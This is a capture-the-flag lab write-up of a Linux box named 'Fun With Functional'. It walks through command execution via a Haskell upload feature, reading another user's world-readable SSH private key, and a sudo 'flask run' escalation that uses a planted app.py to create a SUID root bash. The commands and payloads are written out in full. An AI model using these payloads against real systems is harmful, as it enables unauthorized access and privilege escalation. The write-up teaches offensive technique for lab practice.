---
type: writeup
platform: Exegol
room: Fun With Functional
os: Linux
environment: Web Application / Linux Privilege Escalation
last_verified: 2026-09-28

techniques:
  - server-side-code-execution
  - command-execution
  - credential-discovery
  - ssh-private-key-exposure
  - sudo-abuse
  - python-code-execution
  - suid-abuse

tools:
  - nmap
  - ssh
  - sudo
  - python3
  - flask
---
**Attack path:** User-supplied Haskell execution → RCE as `www-data` → exposed SSH private key → `prof` → sudo `flask run` → malicious `app.py` import → SUID Bash → root

## 1. Reconnaissance

Initial service enumeration:

```bash
nmap -sC -sV -o notes.txt <TARGET_IP>
```

Relevant results:

```bash
22/tcp   open  ssh   OpenSSH 10.0p2 Debian
5001/tcp open  http  Werkzeug httpd 3.1.8 (Python 3.13.5)
```

The web application on port `5001` was titled:

```bash
FUN with functionnal !
```

Only SSH and the custom web application were exposed, so the web service became the initial attack surface.

---

## 2. User-Supplied Haskell Execution

The application allowed a user to upload a Haskell source file.

The server then:

```text
receives the Haskell source
        ↓
compiles it
        ↓
executes the resulting program
        ↓
returns its output
```

Because user-supplied Haskell code could import `System.Process`, the feature could be used to execute operating-system commands.

A test script was created:

```haskell
import System.Process

main = do
    out <- readProcess "sh" ["-c", "id; pwd; find / -name user.txt 2>/dev/null; cat ~/user.txt 2>/dev/null; cat /home/*/user.txt 2>/dev/null"] ""
    putStrLn out
```

The script was uploaded through the application's browser interface.

The server compiled and executed it, returning output similar to:

```bash
[1 of 2] Compiling Main ( /var/www/html/uploads/ilovehaskell.hs, /var/www/html/uploads/ilovehaskell.o )
[2 of 2] Linking /var/www/html/uploads/ilovehaskell

uid=33(www-data) gid=33(www-data) groups=33(www-data)
/
/home/prof/user.txt
```

This confirmed arbitrary command execution under:

```bash
www-data
```

The script also successfully read:

```bash
/home/prof/user.txt
```

and returned the user flag:

```bash
EPI{REDACTED}
```

The important issue was not merely the ability to upload a file. The application **compiled and executed attacker-controlled Haskell with access to `System.Process`**, turning the functionality into server-side command execution.

---

## 3. Enumerating From `www-data`

The privilege-escalation phase was later continued on a fresh lab instance, so the temporary target IP had changed.

The same Haskell execution primitive was reused. Commands were placed inside:

```haskell
readProcess "sh" ["-c", "COMMAND"] ""
```

and the script was re-uploaded whenever additional enumeration was required.

One practical limitation was that `readProcess` failed when the shell command returned a non-zero exit code. For commands likely to encounter permission errors, the source notes therefore appended:

```bash
; true
```

to force a successful exit status and preserve the output.

Initial privilege checks included:

```bash
id
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

Relevant results:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)

sudo: a password is required
```

The SUID enumeration contained only standard system binaries and did not reveal an obvious custom escalation path.

The direct `sudo` and SUID paths were therefore not immediately useful.

---

## 4. Discovering the `prof` Account

Further enumeration examined local users, processes and sudo configuration:

```bash
id
echo '---USERS---'
ls -la /home

echo '---PROCESS---'
ps aux | grep -iE 'haskell|runghc|ghc|stack|root' | grep -v grep

echo '---CRON---'
cat /etc/crontab
ls -la /etc/cron.d/ 2>/dev/null

echo '---SUDOERS---'
ls -la /etc/sudoers.d/ 2>/dev/null

true
```

Relevant output included:

```bash
---USERS---
drwxr-xr-x 1 prof prof ... prof

---PROCESS---
root ... bash /root/scripts/init.sh
root ... sudo -u www-data python3 /var/www/html/app.py

---SUDOERS---
-rw-r--r-- 1 root root 51 prof
```

The important local account was:

```bash
prof
```

A sudoers fragment associated with that user was world-readable:

```bash
/etc/sudoers.d/prof
```

Reading it disclosed:

```bash
prof ALL=(root) NOPASSWD: /usr/local/bin/flask run
```

This did not yet help `www-data` directly, because the rule applied to `prof`.

It did, however, identify a potentially powerful privilege available after obtaining that user's context.

---

## 5. Exposed SSH Private Key

The `prof` home directory was inspected:

```bash
ls -la /home/prof
```

The `.ssh` directory was accessible:

```bash
/home/prof/.ssh
```

Its contents were then enumerated:

```bash
ls -la /home/prof/.ssh
```

A private key was exposed with permissions:

```bash
-rw-r--r-- 1 prof prof ... id_rsa
```

The key could therefore be read from the existing `www-data` execution context:

```bash
cat /home/prof/.ssh/id_rsa
```

The private key itself is intentionally not reproduced in this public write-up.

This provided a direct identity transition:

```text
www-data
   ↓
world-readable private SSH key
   ↓
prof
```

---

## 6. SSH as `prof`

The recovered key was saved locally and restricted to permissions accepted by SSH:

```bash
chmod 600 prof_key
```

It was then used for authentication:

```bash
ssh -i prof_key prof@<TARGET_IP>
```

The new context was verified:

```bash
whoami
id
```

Result:

```bash
prof

uid=1000(prof) gid=1000(prof) groups=1000(prof)
```

The user flag could also be read directly from the account:

```bash
cat ~/user.txt
```

```bash
EPI{REDACTED}
```

At this point, the attack had progressed from web-server execution as `www-data` to an interactive shell as the local user `prof`.

---

## 7. Sudo Privilege as `prof`

Sudo permissions were verified again from the actual `prof` session:

```bash
sudo -l
```

Relevant result:

```bash
User prof may run the following commands on lambda:
    (root) NOPASSWD: /usr/local/bin/flask run
```

This allowed exactly:

```bash
/usr/local/bin/flask run
```

to execute as root without a password.

The danger is that `flask run` locates and imports Python application code before starting the development server.

If `prof` could control which Python module Flask imported, that module's top-level code would execute inside the root Flask process.

---

## 8. Failed `FLASK_APP` Attempt

The first attempt tried to explicitly specify an attacker-controlled application through the `FLASK_APP` environment variable:

```bash
sudo FLASK_APP=/tmp/pwn.py /usr/local/bin/flask run
```

Sudo rejected it:

```bash
sudo: sorry, you are not allowed to set the following environment variables: FLASK_APP
```

The sudo configuration used `env_reset`, preventing this environment variable from being supplied through the privileged command.

The attack therefore had to work without controlling `FLASK_APP`.

---

## 9. Abusing Flask's Default Application Discovery

Without an explicit application configuration, the Flask CLI searches for conventional application modules such as:

```bash
app.py
```

in the current working directory.

Because `prof` controlled the current directory, an attacker-controlled `app.py` could be supplied without modifying the sudo command itself.

A working directory was created:

```bash
mkdir -p /tmp/exploit
```

A malicious application module was then written:

```bash
cat > /tmp/exploit/app.py << 'EOF'
import os
os.system('cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash')
EOF
```

The payload would execute during module import and:

```text
copy /bin/bash to /tmp/rootbash
        ↓
root owns the new file
        ↓
set the SUID bit
```

The privileged Flask command was launched from that directory:

```bash
cd /tmp/exploit
sudo /usr/local/bin/flask run
```

Flask returned:

```bash
Error: Failed to find Flask application or factory in module 'app'.
```

This error occurred **after importing the module**.

The absence of a valid Flask application object therefore prevented the server from starting, but it did not prevent the top-level Python payload from executing.

---

## 10. Confirming Root Code Execution

The generated Bash copy was inspected:

```bash
ls -l /tmp/rootbash
```

Result:

```bash
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

Two details confirmed successful privileged execution:

```text
owner = root
SUID  = set
```

The attacker-controlled `app.py` had therefore executed inside the root Flask process.

The privilege-escalation condition was:

```text
prof controls app.py in current directory
        +
sudo executes flask run as root
        +
Flask imports app.py
        =
attacker-controlled Python executes as root
```

---

## 11. Root Shell

The SUID Bash copy was executed with:

```bash
/tmp/rootbash -p
```

The `-p` option preserves the privileged effective UID instead of dropping the SUID-derived privilege.

Verification:

```bash
id
```

returned:

```bash
uid=1000(prof) gid=1000(prof) euid=0(root) groups=1000(prof)
```

The key value was:

```bash
euid=0(root)
```

Commands were now executing with root privileges.

The final flag was read:

```bash
cat /root/root.txt
```

```bash
EPI{REDACTED}
```

---

## Key Takeaways

- A code-upload feature becomes direct server-side code execution when attacker-controlled programs are compiled and executed without an effective sandbox.
- After gaining RCE, identifying the actual execution identity is essential; here the web application executed code as `www-data`.
- Readable SSH private keys can turn a low-privileged local compromise into authenticated access as another user.
- Discovering another user's sudo rule is useful reconnaissance, but exploitation still requires obtaining that user's security context.
- A restricted sudo command can remain dangerous if the authorized program dynamically loads attacker-controlled code.
- `env_reset` blocked direct control of `FLASK_APP`, but Flask's default application discovery still loaded an attacker-controlled `app.py` from the current directory.
- An application startup failure does not imply that exploitation failed: the malicious module executed during import before Flask rejected the missing application object.
- With SUID Bash, the real and effective user IDs remain distinct; `bash -p` preserved the root effective UID obtained through the SUID file.